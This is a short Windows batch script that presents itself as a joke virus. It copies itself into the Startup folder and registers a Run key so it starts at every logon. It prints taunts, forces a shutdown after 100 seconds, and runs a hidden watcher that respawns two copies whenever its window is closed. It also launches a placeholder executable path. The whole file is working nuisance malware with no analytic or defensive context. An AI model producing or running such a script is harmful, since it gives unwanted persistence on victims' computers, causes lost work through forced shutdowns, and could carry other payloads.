@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Totally Legit Virus.bat"
if /i not "%~f0"=="%startup%" (
    if not exist "%startup%" (
        copy /y "%~f0" "%startup%" >nul 2>&1
    )
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TotallyLegitVirus" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
)
if "%~1"=="watcher" goto WATCHER
if "%~1"=="child" goto CHILD

title Totally Legit Virus.exe
echo yo bro, your pc will shut down now, lol , get hacked noob
echo if you close this, it will come back as two windows!
start "" /min cmd /c "%~f0 watcher"
goto CHILD

:CHILD
shutdown -s -t 100
start /min "" "C:\Path\To\Your\Program.exe"
pause
exit

:WATCHER
title Virus Watcher
:WATCH
timeout /t 2 >nul
tasklist /v | findstr /i "Totally Legit Virus.exe" >nul
if errorlevel 1 (
    start "" cmd /c "%~f0 child"
    start "" cmd /c "%~f0 child"
)
goto WATCH